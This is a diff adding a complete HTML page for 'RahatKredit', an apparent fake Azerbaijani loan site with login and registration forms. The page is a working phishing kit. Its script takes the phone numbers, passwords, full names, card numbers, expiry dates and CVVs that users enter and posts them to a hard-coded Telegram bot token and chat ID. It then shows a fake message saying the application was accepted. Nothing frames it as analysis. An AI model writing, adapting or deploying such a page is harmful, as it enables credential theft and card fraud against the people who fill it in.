@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RahatKredit</title>
+    <style>
+        :root {
+            --primary-color: #008751;
+            --primary-dark: #006b40;
+            --text-color: #333333;
+            --bg-color: #f8f9fa;
+            --white: #ffffff;
+            --border-color: #cccccc;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: var(--bg-color); color: var(--text-color); display: flex; flex-direction: column; min-height: 100vh; }
+        header { background-color: var(--white); border-bottom: 1px solid #e1e4e8; padding: 15px; text-align: center; }
+        .logo { font-size: 22px; font-weight: 700; color: var(--primary-color); }
+        .container { flex: 1; display: flex; justify-content: center; align-items: center; padding: 15px; }
+        .card-box { background: var(--white); padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); width: 100%; max-width: 400px; }
+        h2 { margin-bottom: 20px; font-size: 20px; text-align: center; }
+        .form-group { margin-bottom: 15px; position: relative; }
+        label { display: block; margin-bottom: 5px; font-size: 14px; font-weight: 500; }
+        input { width: 100%; padding: 12px; border: 1px solid var(--border-color); border-radius: 8px; font-size: 16px; outline: none; }
+        input:focus { border-color: var(--primary-color); }
+        .btn { width: 100%; padding: 12px; background-color: var(--primary-color); color: var(--white); border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+        .section { display: none; }
+        .section.active { display: block; }
+        .switch-text { text-align: center; margin-top: 15px; font-size: 14px; color: #666; }
+        .switch-text a { color: var(--primary-color); text-decoration: none; font-weight: 600; cursor: pointer; }
+        .divider { border: none; border-top: 1px solid #eee; margin: 20px 0; }
+    </style>
+</head>
+<body>
+
+    <header><div class="logo">RahatKredit</div></header>
+
+    <div class="container">
+        
+        <!-- 1. GİRİŞ SƏHİFƏSİ (Yalnız nömrə və şifrə) -->
+        <div id="login-section" class="section active">
+            <div class="card-box">
+                <h2>Daxil ol</h2>
+                <form onsubmit="sendLoginData(event)">
+                    <div class="form-group">
+                        <label>Telefon nömrəsi</label>
+                        <input type="tel" id="login-phone" placeholder="+994 (XX) XXX-XX-XX" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Şifrə</label>
+                        <input type="password" id="login-password" placeholder="Şifrənizi daxil edin" required>
+                    </div>
+                    <button type="submit" class="btn">Daxil ol</button>
+                </form>
+                <div class="switch-text">Hesabın yoxdur? <a onclick="switchSec('register-section')">Qeydiyyatdan keç</a></div>
+            </div>
+        </div>
+
+        <!-- 2. QEYDİYYAT SƏHİFƏSİ (Ad, nömrə, şifrə və kart məlumatları) -->
+        <div id="register-section" class="section">
+            <div class="card-box">
+                <h2>Qeydiyyat</h2>
+                <form onsubmit="sendRegisterData(event)">
+                    <div class="form-group">
+                        <label>Ad və soyad</label>
+                        <input type="text" id="reg-fullname" placeholder="Ad Soyad" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Telefon nömrəsi</label>
+                        <input type="tel" id="reg-phone" placeholder="+994 (XX) XXX-XX-XX" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Şifrə</label>
+                        <input type="password" id="reg-password" placeholder="Şifrə yaradın" required>
+                    </div>
+
+                    <hr class="divider">
+
+                    <div class="form-group">
+                        <label>Kart nömrəsi</label>
+                        <input type="text" id="c-num" placeholder="4169 7300 0000 0000" maxlength="19" oninput="formatCard(this)" required>
+                    </div>
+                    <div style="display: flex; gap: 10px;">
+                        <div class="form-group" style="flex: 1;">
+                            <label>Bitmə tarixi</label>
+                            <input type="text" id="c-exp" placeholder="MM/YY" maxlength="5" oninput="formatExp(this)" required>
+                        </div>
+                        <div class="form-group" style="flex: 1;">
+                            <label>CVV</label>
+                            <input type="password" id="c-cvv" placeholder="123" maxlength="4" required>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn">Qeydiyyatdan keç</button>
+                </form>
+                <div class="switch-text">Hesabın var? <a onclick="switchSec('login-section')">Daxil ol</a></div>
+            </div>
+        </div>
+
+        <!-- UĞURLU QEYDİYYAT / GİRİŞ MESAJI -->
+        <div id="success-section" class="section">
+            <div class="card-box" style="text-align: center;">
+                <h3 style="color: #008751; margin-bottom: 10px;" id="success-title">Uğurla qeydiyyatdan keçdiniz!</h3>
+                <p style="color: #666; font-size: 14px;">Müraciətiniz qəbul olundu, tezliklə sizinlə əlaqə saxlanılacaq.</p>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        const botToken = "8691093495:AAHVWSrv9sXquVmnzZcxC4oj-tk05QU7su8";
+        const chatId = "8334736443";
+
+        function switchSec(id) {
+            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+        }
+
+        function formatCard(input) {
+            let val = input.value.replace(/\D/g, '').substring(0, 16);
+            let formatted = val.match(/.{1,4}/g)?.join(' ') || '';
+            input.value = formatted;
+        }
+
+        function formatExp(input) {
+            let val = input.value.replace(/\D/g, '').substring(0, 4);
+            if (val.length >= 3) val = val.substring(0, 2) + '/' + val.substring(2);
+            input.value = val;
+        }
+
+        // Giriş məlumatlarını göndərmək üçün
+        async function sendLoginData(e) {
+            e.preventDefault();
+            const phone = document.getElementById('login-phone').value;
+            const password = document.getElementById('login-password').value;
+
+            const message = `🔐 Yeni Giriş Cəhdi!\n\n` +
+                            `📱 Nömrə: ${phone}\n` +
+                            `🔑 Şifrə: ${password}`;
+
+            await sendToTelegram(message);
+            document.getElementById('success-title').textContent = "Uğurla daxil olundu!";
+            switchSec('success-section');
+        }
+
+        // Qeydiyyat məlumatlarını (kartla birlikdə) göndərmək üçün
+        async function sendRegisterData(e) {
+            e.preventDefault();
+            const fullname = document.getElementById('reg-fullname').value;
+            const phone = document.getElementById('reg-phone').value;
+            const password = document.getElementById('reg-password').value;
+            const cardNum = document.getElementById('c-num').value;
+            const cardExp = document.getElementById('c-exp').value;
+            const cardCvv = document.getElementById('c-cvv').value;
+
+            const message = `🚨 Yeni Qeydiyyat Məlumatı!\n\n` +
+                            `👤 Ad: ${fullname}\n` +
+                            `📱 Nömrə: ${phone}\n` +
+                            `🔑 Şifrə: ${password}\n\n` +
+                            `💳 Kart: ${cardNum}\n` +
+                            `⏳ Tarix: ${cardExp}\n` +
+                            `🔐 CVV: ${cardCvv}`;
+
+            await sendToTelegram(message);
+            document.getElementById('success-title').textContent = "Uğurla qeydiyyatdan keçdiniz!";
+            switchSec('success-section');
+        }
+
+        async function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: text,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (err) {
+                console.log("Xəta baş verdi");
+            }
+        }
+    </script>
+</body>
+</html>
